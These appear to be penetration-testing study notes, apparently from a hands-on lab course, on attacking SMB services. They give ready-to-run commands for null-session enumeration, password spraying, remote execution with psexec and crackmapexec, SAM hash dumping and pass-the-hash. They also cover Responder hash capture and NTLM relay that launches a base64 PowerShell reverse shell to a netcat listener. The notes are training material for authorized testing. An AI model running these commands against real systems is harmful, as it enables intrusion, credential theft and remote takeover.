## Misconfigurations

SMB can be configured not to require authentication, which is often called a `null session`. Instead, we can log in to a system with no username or password.
#### Anonymous Authentication

If we find an SMB server that does not require a username and password or find valid credentials, we can get a list of shares, usernames, groups, permissions, policies, services, etc. Most tools that interact with SMB allow null session connectivity, including `smbclient`, `smbmap`, `rpcclient`, or `enum4linux`.

 Let's explore how we can interact with file shares and RPC using null authentication.

#### File Share

Using `smbclient`, we can display a list of the server's shares with the option `-L`, and using the option `-N`, we tell `smbclient` to use the null session.

	AstraX01@htb[/htb]$ smbclient -N -L //10.129.14.128

#### SMBMAP 

 An advantage of `smbmap` is that it provides a list of permissions for each shared folder.

	AstraX01@htb[/htb]$ smbmap -H 10.129.14.128

Using `smbmap` with the `-r` or `-R` (recursive) option, one can browse the directories:

	AstraX01@htb[/htb]$ smbmap -H 10.129.14.128 -r notes

#### Download File using SMBMAP 

	AstraX01@htb[/htb]$ smbmap -H 10.129.14.128 --download "notes\note.txt"

#### Upload File using SMBMAP 

	AstraX01@htb[/htb]$ smbmap -H 10.129.14.128 --upload test.txt "notes\test.txt"

### Remote Procedure Call (RPC)

We can use the `rpcclient` tool with a null session to enumerate a workstation or Domain Controller.

	AstraX01@htb[/htb]$ rpcclient -U'%' 10.10.110.17

	rpcclient $> enumdomusers

	user:[mhope] rid:[0x641]
	user:[svc-ata] rid:[0xa2b] 
	user:[svc-bexec] rid:[0xa2c] 
	user:[roleary] rid:[0xa36] 
	user:[smorgan] rid:[0xa37]

Can check the help menu for all commands that `rpcclient` offers us.

#### Enum4Linux 

`Enum4linux` is another utility that supports null sessions, and it utilizes `nmblookup`, `net`, `rpcclient`, and `smbclient` to automate some common enumeration from SMB targets.

	AstraX01@htb[/htb]$ ./enum4linux-ng.py 10.10.11.45 -A -C

## Protocol Specifics Attacks

If a null session is not enabled, we will need credentials to interact with the SMB protocol. Two common ways to obtain credentials are [brute forcing](https://en.wikipedia.org/wiki/Brute-force_attack) and [password spraying](https://owasp.org/www-community/attacks/Password_Spraying_Attack).

#### Brute Forcing and Password Spray

Password spraying using `crackmapexec`      

	AstraX01@htb[/htb]$ crackmapexec smb 10.10.110.17 -u userlist.txt -p 'Company01!' --local-auth

**Note:** By default CME will exit after a successful login is found. Using the `--continue-on-success` flag will continue spraying even after a valid password is found.

**Note:** If we are targetting a non-domain joined computer, we will need to use the option `--local-auth`.

#### SMB

Linux and Windows SMB servers provide different attack paths. Usually, we will only get access to the file system, abuse privileges, or exploit known vulnerabilities in a Linux environment.

When attacking a Windows SMB Server, our actions will be limited by the privileges we had on the user we manage to compromise. If this user is an Administrator or has specific privileges, we will be able to perform operations such as:

- Remote Command Execution
- Extract Hashes from SAM Database
- Enumerating Logged-on Users
- Pass-the-Hash (PTH)

#### Remote Code Execution (RCE)

###### PsExec

is a tool that lets us execute processes on other systems, complete with full interactivity for console applications, without having to install client software manually.

#### Impacket PsExec

To use `impacket-psexec`, we need to provide the domain/username, the password, and the IP address of our target machine. For more detailed information we can use impacket help:

To connect to a remote machine with a local administrator account, using `impacket-psexec`, you can use the following command:

	AstraX01@htb[/htb]$ impacket-psexec administrator:'Password123!'@10.10.110.17

	C:\Windows\system32>whoami && hostname
	
	nt authority\system
	WIN7BOX

The same options apply to `impacket-smbexec` and `impacket-atexec`.

#### CrackMapExec

Another tool we can use to run CMD or PowerShell is `CrackMapExec`. One advantage of `CrackMapExec` is the availability to run a command on multiples host at a time. To use it, we need to specify the protocol, `smb`, the IP address or IP address range, the option `-u` for username, and `-p` for the password, and the option `-x` to run cmd commands or uppercase `-X` to run PowerShell commands.

	AstraX01@htb[/htb]$ crackmapexec smb 10.10.110.17 -u Administrator -p 'Password123!' -x 'whoami' --exec-method smbexec

**Note:** If the`--exec-method` is not defined, CrackMapExec will try to execute the atexec method, if it fails you can try to specify the `--exec-method` smbexec.

#### Enumerating Logged-on Users Using Crackmapexec 

Imagine we are in a network with multiple machines. Some of them share the same local administrator account. In this case, we could use `CrackMapExec` to enumerate logged-on users on all machines within the same network `10.10.110.17/24`, which speeds up our enumeration process.

	AstraX01@htb[/htb]$ crackmapexec smb 10.10.110.0/24 -u administrator -p 'Password123!' --loggedon-users

#### Extract Hashes from SAM Database

The Security Account Manager (SAM) is a database file that stores users' passwords. It can be used to authenticate local and remote users. If we get administrative privileges on a machine, we can extract the SAM database hashes for different purposes:

	AstraX01@htb[/htb]$ crackmapexec smb 10.10.110.17 -u administrator -p 'Password123!' --sam

#### Pass-the-Hash (PtH)

If we manage to get an NTLM hash of a user, and if we cannot crack it, we can still use the hash to authenticate over SMB with a technique called Pass-the-Hash (PtH).

 We can use a PtH attack with any `Impacket` tool, `SMBMap`, `CrackMapExec`

##### Pass the Hash Using crackmapexec 

	AstraX01@htb[/htb]$ crackmapexec smb 10.10.110.17 -u Administrator -H 2B576ACBE6BCFDA7294D6BD18041B8FE

### Forced Authentication Attacks

We can also abuse the SMB protocol by creating a fake SMB Server to capture users' [NetNTLM v1/v2 hashes](https://medium.com/@petergombos/lm-ntlm-net-ntlmv2-oh-my-a9b235c58ed4).

The most common tool to perform such operations is the `Responder`.

Let's illustrate an example to understand better how `Responder` works. Imagine we created a fake SMB server using the Responder default configuration, with the following command:

	AstraX01@htb[/htb]$ responder -I <interface name>

When a user or a system tries to perform a Name Resolution (NR), a series of procedures are conducted by a machine to retrieve a host's IP address by its hostname. On Windows machines, the procedure will roughly be as follows:

- The hostname file share's IP address is required.
- The local host file (C:\Windows\System32\Drivers\etc\hosts) will be checked for suitable records.
- If no records are found, the machine switches to the local DNS cache, which keeps track of recently resolved names.
- Is there no local DNS record? A query will be sent to the DNS server that has been configured.
- If all else fails, the machine will issue a multicast query, requesting the IP address of the file share from other machines on the network.

Suppose a user mistyped a shared folder's name `\\mysharefoder\` instead of `\\mysharedfolder\`. In that case, all name resolutions will fail because the name does not exist, and the machine will send a multicast query to all devices on the network, including us running our fake SMB server. This is a problem because no measures are taken to verify the integrity of the responses. Attackers can take advantage of this mechanism by listening in on such queries and spoofing responses, leading the victim to believe malicious servers are trustworthy. This trust is usually used to steal credentials.

	AstraX01@htb[/htb]$ sudo responder -I ens33

These captured credentials can be cracked using [hashcat](https://hashcat.net/hashcat/) or relayed to a remote host to complete the authentication and impersonate the user.

All saved Hashes are located in Responder's logs directory (`/usr/share/responder/logs/`). We can copy the hash to a file and attempt to crack it using the hashcat module 5600.

	AstraX01@htb[/htb]$ hashcat -m 5600 hash.txt /usr/share/wordlists/rockyou.txt

### Relay Attack 

If we cannot crack the hash, we can potentially relay the captured hash to another machine using [impacket-ntlmrelayx](https://github.com/SecureAuthCorp/impacket/blob/master/examples/ntlmrelayx.py) or Responder [MultiRelay.py](https://github.com/lgandx/Responder/blob/master/tools/MultiRelay.py). Let us see an example using `impacket-ntlmrelayx`.

First, we need to set SMB to `OFF` in our responder configuration file (`/etc/responder/Responder.conf`).

	n1tesh0x00@htb[/htb]$ cat /etc/responder/Responder.conf | grep 'SMB ='

	SMB = Off

Then we execute `impacket-ntlmrelayx` with the option `--no-http-server`, `-smb2support`, and the target machine with the option `-t`. By default, `impacket-ntlmrelayx` will dump the SAM database, but we can execute commands by adding the option `-c`.

	AstraX01@htb[/htb]$ impacket-ntlmrelayx --no-http-server -smb2support -t 10.10.110.146

We can create a PowerShell reverse shell using [https://www.revshells.com/](https://www.revshells.com/), set our machine IP address, port, and the option Powershell #3 (Base64).

	AstraX01@htb[/htb]$ impacket-ntlmrelayx --no-http-server -smb2support -t 192.168.220.146 -c 'powershell -e base64EncodedPayload'

Once the victim authenticates to our server, we poison the response and make it execute our command to obtain a reverse shell.

	AstraX01@htb[/htb]$ nc -lvnp 9001